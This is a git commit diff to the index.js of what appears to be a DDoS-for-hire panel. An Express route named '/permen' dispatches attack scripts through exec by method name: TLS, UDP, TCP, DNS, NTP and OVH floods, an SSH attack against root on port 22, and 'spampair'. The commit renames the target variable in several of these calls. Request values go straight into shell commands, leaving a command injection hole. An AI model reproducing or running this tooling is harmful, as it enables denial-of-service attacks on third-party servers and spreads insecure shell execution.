c4fe5db3104d5614e89758dbe533161e5bcc4681
Yanti Anniza <yantianniza@outlook.com>
2024-10-09 11:08:44 +0800

    Add files via upload

--- index.js
+++ index.js
@@ -72,17 +72,17 @@ app.get('/permen', (req, res) => {
   } else if (methods === 'tls-slow') {
     exec(`node methods/YAT-TLS.js ${target} ${time} 65 4 proxy.txt`);
   } else if (methods === 'udp') {
-    exec(`node methods/udp.js ${target} ${port} ${duration}`);
+    exec(`node methods/udp.js ${slurp} ${port} ${duration}`);
   } else if (methods === 'kill-ssh') {
-    exec(`node methods/StarsXSSH.js ${target} 22 root ${duration}`);
+    exec(`node methods/StarsXSSH.js ${slurp} 22 root ${duration}`);
   } else if (methods === 'tcp') {
-    exec(`node methods/tcp.js ${target} ${port} ${duration}`);
+    exec(`node methods/tcp.js ${slurp} ${port} ${duration}`);
   } else if (methods === 'dns') {
-    exec(`node methods/dns.js ${target} ${port} ${duration}`);
+    exec(`node methods/dns.js ${slurp} ${port} ${duration}`);
   } else if (methods === 'ntp') {
-    exec(`node methods/ntp.js ${target} ${port} ${duration}`);
+    exec(`node methods/ntp.js ${slurp} ${port} ${duration}`);
   } else if (methods === 'ovh') {
-    exec(`node methods/ovh.js ${target} ${port} ${duration}`);
+    exec(`node methods/ovh.js ${slurp} ${port} ${duration}`);
   } else if (methods === 'spampair') {
     exec(`node lib/spampair.js ${target} ${duration}`);
   } else {
